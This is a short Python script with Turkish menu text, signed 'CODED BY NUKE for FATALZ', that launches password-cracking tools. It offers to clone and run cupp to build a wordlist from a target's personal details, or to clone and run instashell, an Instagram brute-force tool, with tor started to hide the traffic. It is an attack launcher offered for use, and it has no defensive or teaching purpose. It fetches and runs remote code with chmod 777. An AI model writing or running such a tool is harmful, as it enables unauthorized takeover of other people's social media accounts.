#!/usr/bin/env python
# -*- coding: utf-8 -*-


import os

os.system("apt install git -y")
os.system("apt install figlet")
os.system("clear")
os.system("figlet NUKE BRUTE FORCE ")
print("""  CODED BY NUKE for FATALZ 
          1) WORDLIST OLUSTUR 
          2) BRUTE FORCE YAP 
 """)
secim = int(input("Seçim : "))
	
if secim== 1 :
    os.system("git clone https://github.com/Mebus/cupp.git")
    os.system("cd cupp/ && chmod 777 cupp.py && python3 cupp.py -i")
	
elif secim== 2 :
    os.system("git clone https://github.com/maxrooted/instashell.git ") 
    os.system("cd instashell/ && chmod 777 install.sh && chmod 777 instashell.sh && service tor start && ./install.sh && ./instashell.sh")
else:
	print(" Geçersiz Değer Girdin  ")        
